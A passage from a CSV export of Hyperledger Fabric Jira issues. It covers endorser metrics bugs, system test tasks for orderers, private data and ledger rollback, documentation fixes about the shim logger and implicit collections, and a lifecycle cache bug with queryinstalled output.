endorser_propsal_duration_count{chaincode=""VSCod0108JS:0.0.1"",channel=""channel1"",success=""true""} 1
endorser_propsal_duration_count{chaincode=""VSCod0108JS:"",channel=""channel1"",success=""false""} 1
endorser_propsal_duration_sum{chaincode=""cscc:"",channel="""",success=""true""} 0.40356276699999993
endorser_propsal_duration_sum{chaincode=""lscc:"",channel=""channel1"",success=""false""} 0.167240214
endorser_propsal_duration_sum{chaincode=""lscc:"",channel="""",success=""true""} 1.432504239
endorser_propsal_duration_sum{chaincode=""lscc:v1.4.3"",channel=""channel1"",success=""true""} 76.092053921
endorser_propsal_duration_sum{chaincode=""lscc:v1.4.3"",channel=""channel2"",success=""true""} 0.670814996
endorser_propsal_duration_sum{chaincode=""qscc:"",channel="""",success=""true""} 0.504759506
endorser_propsal_duration_sum{chaincode=""VSCod0108JS:0.0.1"",channel=""channel1"",success=""true""} 74.32668823
endorser_propsal_duration_sum{chaincode=""VSCod0108JS:"",channel=""channel1"",success=""false""} 0.076259388
endorser_successful_proposals 280
{code}

If we received 282 proposals and only 280 are successful, where are the other 2?

Well, if we look carefully (?) we see a hint:

{code}
endorser_propsal_duration_count{chaincode=""lscc:"",channel=""channel1"",success=""false""} 1
endorser_propsal_duration_count{chaincode=""VSCod0108JS:"",channel=""channel1"",success=""false""} 1
{code}

Something is broken....

And, of course, we don't seem to have any tests for failed endorsement metrics so (in retrospect) this is unsurprising.",,denyeart,sykesm,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17525,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zlsp",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,sykesm,tsharris,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jan/20 3:54 AM;tsharris;[https://github.com/hyperledger/fabric/pull/572]

[https://github.com/hyperledger/fabric/pull/571];;;","08/Feb/20 4:18 AM;denyeart;This was merged in release-1.4 for v1.4.5, and master for v2.1.;;;","24/Feb/20 2:39 PM;denyeart;Unfortunately, this caused a regression in master - FAB-17525.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: remove and add/onboard orderers,FAB-17358,43935,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,,scottz,scottz,10/Jan/20 7:53 AM,11/Jan/21 2:29 AM,28/Oct/23 3:09 AM,11/Jan/21 2:29 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"config changes: remove a raft orderer from application channel, and onboard it again dynamically; see 14753 or 14357; add/remove multiple orderers or do it repeatedly with same one, during traffic on that channel.

Refer also to FAB-16260.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16260,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10084,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb130i",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: remove and add ordererorg in application channel and system channel,FAB-17359,43936,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 7:57 AM,11/Jan/21 2:29 AM,28/Oct/23 3:09 AM,11/Jan/21 2:29 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"config changes: remove an ordererorg from applic chan and syschan,

and add it again,

and add/onboard orderer(s) again dynamically to syschan and applic chan (similar to 13861); all while running traffic on that channel

Refer also to FAB-16260.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16260,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10084,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb2c",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: remove, and add again, peer organization to channel",FAB-17360,43937,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,,scottz,scottz,10/Jan/20 8:00 AM,11/Jan/21 2:28 AM,28/Oct/23 3:09 AM,11/Jan/21 2:28 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"config changes: remove a peer org from application channel,

and add it again,

and join the org's peer(s) again to the chan (similar to 13861);

all while running traffic on that channel

Some TX may be rejected.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10084,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb131",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: privatedata collections traffic,FAB-17361,43938,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 8:13 AM,11/Jan/21 2:28 AM,28/Oct/23 3:09 AM,11/Jan/21 2:28 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"privatedata collections traffic, e.g. at a minimum, run testcase FAB-10135. 

Validate final TXs and channel blockheights on all peers; 

Refer also to FAB-12834 for possible traffic configuration.

Longterm goal is to complete and automate FAB-16074, a more comprehensive test for private data collections, and execute that in future releases test automation suites.

 ",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17367,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb2i",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: privatedata reconciliation: add org to collection,FAB-17362,43939,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 8:28 AM,11/Jan/21 2:28 AM,28/Oct/23 3:09 AM,11/Jan/21 2:28 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"config changes: with privatedata traffic, Add an org to collection, whereas peers and org in channel already so only reconciliation of private data is needed. Execute FAB-11773.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-11773,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10084,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb132",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: privatedata reconciliation: add peer to channel,FAB-17363,43940,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 8:30 AM,11/Jan/21 2:28 AM,28/Oct/23 3:09 AM,11/Jan/21 2:28 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"Execute FAB-11772.

config changes: with privatedata, Join peer to channel, catchup ALL blocks AND reconciliation of private data.",,btl5037,denyeart,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-11772,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10084,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb133",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,denyeart,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jan/20 11:31 PM;denyeart;[~scottz] If this test simply joins a peer to a channel, it will catchup to block height as normal and pull private data as blocks are committed. It will not exercise reconciliation unless its org was added to a collection at some block height. Is that the case?  If so, this test could be used for catchup and reconciliation (no need for separate FAB-17362).;;;","11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: rollback peer ledger,FAB-17364,43941,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,,scottz,scottz,10/Jan/20 8:45 AM,11/Jan/21 2:28 AM,28/Oct/23 3:09 AM,11/Jan/21 2:28 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"Rollback peer ledger, which has a large chain, back a few and again back a long ways.

Execute FAB-16032. May refer also to FAB-15798 and FAB-16143.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16032,,,FAB-16143,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10084,,,Manual,,Unset,No,,,"1|hzwqrk:5iwr4rb13009",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: reset peer ledger,FAB-17365,43942,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 8:46 AM,11/Jan/21 2:28 AM,28/Oct/23 3:09 AM,11/Jan/21 2:28 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"Reset peer ledger, which has a large chain, back to beginning to genesis block.

Execute FAB-16028. May refer also to FAB-15798 and FAB-16143.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16028,,,FAB-16143,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10084,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb139",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: traffic longrun 1 week,FAB-17366,43943,,Test Task,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,scottz,scottz,10/Jan/20 8:52 AM,11/Jan/21 2:27 AM,28/Oct/23 3:09 AM,11/Jan/21 2:27 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"Run variety of traffic at moderate levels for 7 days.

Refer to FAB-13810 or FAB-17002.

Let's include a quiet time in the middle, with no traffic for a day, then resume, to ensure no problems occur due to extended idle periods.",,btl5037,scottz,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-13810,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10080,,,Automated,,Unset,No,,,"1|hzwqrk:5iwr4rb1300i",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Executing,,System Test,,(Please add usage information),btl5037,scottz,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/20 5:29 AM;suryalnvs;Longrun has been started on community-longrun lab.

Fabric: 2.0.0-stable

Run URL: [https://dev.azure.com/suryalnvs/Fabric-Test-Local/_build/results?buildId=117&view=results]

Prometheus URL: http://169.62.57.123:30332/;;;","11/Jan/21 2:06 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: service discovery with peers and orderers, privatedata traffic",FAB-17367,43944,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 9:10 AM,11/Jan/21 1:40 AM,28/Oct/23 3:09 AM,11/Jan/21 1:40 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"Execute FAB-17002.

Use service discovery for the peers and orderers while sending privatedata traffic (should be similar in functionality to FAB-17361 plus servdisc). Do not use collection names in the invokes.

Use map.cc, or use marbles02_private cc with transient args (after merging FAB-17183).",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17002,FAB-17361,,FAB-17183,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb13i",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: service discovery with peers and orderers, privatedata traffic with collection names",FAB-17368,43945,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,,scottz,scottz,10/Jan/20 9:14 AM,11/Jan/21 1:40 AM,28/Oct/23 3:09 AM,11/Jan/21 1:40 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"Use service discovery for the peers and orderers while sending privatedata traffic WITH privatedata collection names in the invokes.

Similar to FAB-17367 (which did not require collection names).

Blocked by FAB-15066 (2.0), FAB-17279 (2.0 or 2.1), and any nodesdk changes to use it (FABN-???), and pte client changes to use it (FAB-???).",,scottz,,,,,,,,,,,,,,,,,,,,,FAB-17279,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb2o",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: Chaos testing: stop,delay,start peers and orderers",FAB-17369,43946,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,scottz,scottz,10/Jan/20 9:45 AM,11/Jan/21 1:39 AM,28/Oct/23 3:09 AM,11/Jan/21 1:39 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"This is a near-duplicate of FAB-16258, which performs restarts (which are very quick) - but this test requires a delay (potentially between 30 secs - 10 minutes) after stopping nodes before starting them again. We want the untouched peers and orderers to adapt and proceed without the stopped nodes for some time, before welcoming them back into the fold.",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16258,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10084,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb2u",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Delete old information about shim’s Logger from some documents,FAB-17370,43947,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Low,,tatsu-sato,tatsu-sato,tatsu-sato,10/Jan/20 11:28 AM,11/Jan/20 7:06 AM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,"Logger has been removed from Go chaincode shim by FAB-15366 updates.
However, old information about the shim’s Logger remains in some documents.

1. 
In `docs/source/upgrade_to_newest_version.md`, there is the following description.

{noformat}
Support for user chaincodes to utilize the chaincode shim's logger via `NewLogger()` has been deprecated. Chaincodes that used the shim's `NewLogger()` must now shift to their own preferred logging mechanism.
{noformat}

The “deprecated” should be “removed”.

2. 
In `docs/source/logging-control.rst`, there is the following description.

{noformat}
Logging in the peer and orderer is provided by the common/flogging package. Chaincodes written in Go also use this package if they use the logging methods provided by the shim. This package supports
{noformat}

“Chaincodes written in Go also use this package if they use the logging methods provided by the shim.” should be removed.
",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017iz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
_lifecycle should reject `ApproveForMyOrg` call if it does not modify anything,FAB-17371,43948,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,10/Jan/20 1:04 PM,13/Jan/20 11:38 AM,28/Oct/23 3:09 AM,13/Jan/20 11:38 AM,,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,,,,,,"instead of picking default LifecycleEndorsement policy, and later on failing validation with {{policy unsatisfied}} error

(basically fail early and be more clear)",,guoger,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017j7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,tatsu-sato,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Jan/20 11:38 AM;guoger;https://github.com/hyperledger/fabric/pull/485;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
lifecycle cache should remove local chaincode reference when new definition is committed with new chaincode package,FAB-17372,43950,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,10/Jan/20 11:38 PM,15/Jan/20 11:35 PM,28/Oct/23 3:09 AM,15/Jan/20 11:35 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"When installing a chaincode package ""my_simple_chaincode"", committing a definition with name ""mycc"" and version ""0.0"", I see the expected output from the ""queryinstalled"" command, which gets its data from the lifecycle cache: 
{code:java}
[o][peer-lifecycle-chaincode-queryinstalled] {
[o][peer-lifecycle-chaincode-queryinstalled] 	""installed_chaincodes"": [
[o][peer-lifecycle-chaincode-queryinstalled] 		{
[o][peer-lifecycle-chaincode-queryinstalled] 			""package_id"": ""my_simple_chaincode:ab63d153fc8ac7ceb225cf365b6e8021a1e8086b773e0004fb0f629ba10ee169"",
[o][peer-lifecycle-chaincode-queryinstalled] 			""label"": ""my_simple_chaincode"",
[o][peer-lifecycle-chaincode-queryinstalled] 			""references"": {
[o][peer-lifecycle-chaincode-queryinstalled] 				""testchannel"": {
[o][peer-lifecycle-chaincode-queryinstalled] 					""chaincodes"": [
[o][peer-lifecycle-chaincode-queryinstalled] 						{
[o][peer-lifecycle-chaincode-queryinstalled] 							""name"": ""mycc"",
[o][peer-lifecycle-chaincode-queryinstalled] 							""version"": ""0.0""
[o][peer-lifecycle-chaincode-queryinstalled] 						}
[o][peer-lifecycle-chaincode-queryinstalled] 					]
[o][peer-lifecycle-chaincode-queryinstalled] 				}
[o][peer-lifecycle-chaincode-queryinstalled] 			}
[o][peer-lifecycle-chaincode-queryinstalled] 		},
[o][peer-lifecycle-chaincode-queryinstalled] 		{
[o][peer-lifecycle-chaincode-queryinstalled] 			""package_id"": ""my_simple_chaincode_updated:7ec88ede74e904886aefd3ee77949706e5569dda4d198772fd87f2b8a0a6a68a"",
[o][peer-lifecycle-chaincode-queryinstalled] 			""label"": ""my_simple_chaincode_updated""
[o][peer-lifecycle-chaincode-queryinstalled] 		}
[o][peer-lifecycle-chaincode-queryinstalled] 	]
[o][peer-lifecycle-chaincode-queryinstalled] } {code}
Then, after installing an updated chaincode package ""my_simple_chaincode_updated"" and updating the chaincode definition for ""mycc"" to version ""1.0"",  the lifecycle cache is inadvertently updating the references for both chaincode packages:
{code:java}
[o][peer-lifecycle-chaincode-queryinstalled] {
[o][peer-lifecycle-chaincode-queryinstalled] 	""installed_chaincodes"": [
[o][peer-lifecycle-chaincode-queryinstalled] 		{
[o][peer-lifecycle-chaincode-queryinstalled] 			""package_id"": ""my_simple_chaincode:ab63d153fc8ac7ceb225cf365b6e8021a1e8086b773e0004fb0f629ba10ee169"",
[o][peer-lifecycle-chaincode-queryinstalled] 			""label"": ""my_simple_chaincode"",
[o][peer-lifecycle-chaincode-queryinstalled] 			""references"": {
[o][peer-lifecycle-chaincode-queryinstalled] 				""testchannel"": {
[o][peer-lifecycle-chaincode-queryinstalled] 					""chaincodes"": [
[o][peer-lifecycle-chaincode-queryinstalled] 						{
[o][peer-lifecycle-chaincode-queryinstalled] 							""name"": ""mycc"",
[o][peer-lifecycle-chaincode-queryinstalled] 							""version"": ""1.0""
[o][peer-lifecycle-chaincode-queryinstalled] 						}
[o][peer-lifecycle-chaincode-queryinstalled] 					]
[o][peer-lifecycle-chaincode-queryinstalled] 				}
[o][peer-lifecycle-chaincode-queryinstalled] 			}
[o][peer-lifecycle-chaincode-queryinstalled] 		},
[o][peer-lifecycle-chaincode-queryinstalled] 		{
[o][peer-lifecycle-chaincode-queryinstalled] 			""package_id"": ""my_simple_chaincode_upgraded:7ec88ede74e904886aefd3ee77949706e5569dda4d198772fd87f2b8a0a6a68a"",
[o][peer-lifecycle-chaincode-queryinstalled] 			""label"": ""my_simple_chaincode_updated"",
[o][peer-lifecycle-chaincode-queryinstalled] 			""references"": {
[o][peer-lifecycle-chaincode-queryinstalled] 				""testchannel"": {
[o][peer-lifecycle-chaincode-queryinstalled] 					""chaincodes"": [
[o][peer-lifecycle-chaincode-queryinstalled] 						{
[o][peer-lifecycle-chaincode-queryinstalled] 							""name"": ""mycc"",
[o][peer-lifecycle-chaincode-queryinstalled] 							""version"": ""1.0""
[o][peer-lifecycle-chaincode-queryinstalled] 						}
[o][peer-lifecycle-chaincode-queryinstalled] 					]
[o][peer-lifecycle-chaincode-queryinstalled] 				}
[o][peer-lifecycle-chaincode-queryinstalled] 			}
[o][peer-lifecycle-chaincode-queryinstalled] 		}
[o][peer-lifecycle-chaincode-queryinstalled] 	]
[o][peer-lifecycle-chaincode-queryinstalled] }  {code}
The lifecycle cache should be updated to remove the reference to ""mycc"" for the original chaincode package (""my_simple_chaincode"").",,tatsu-sato,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17046,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zfzzzj",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Jan/20 4:58 AM;wlahti;[https://github.com/hyperledger/fabric/pull/488]

Initial PR with bug fix and unit tests. Follow-up PR to come shortly to include an integration test.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document implicit collection key concepts,FAB-17373,43951,,Documentation,In Progress,FAB,Fabric,software,denyeart,,,Medium,,denyeart,caod,caod,11/Jan/20 12:30 AM,20/Apr/21 11:05 PM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,v2.1.0,,,,fabric-ledger,fabric-peer,,,,,,,,0,,,,,,We could use better documentation around implicit collections in the private data docs. Let's also add documentation around the new org-specific configuration properties from FAB-17303,,caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqxqo4",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jan/20 1:54 AM;caod;[https://github.com/hyperledger/fabric/pull/540];;;","26/Feb/20 3:49 AM;denyeart;Also need to mention in doc that memberOnlyRead and memberOnlyWrite are not available for implicit collections... users should add acl logic in their chaincode instead.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
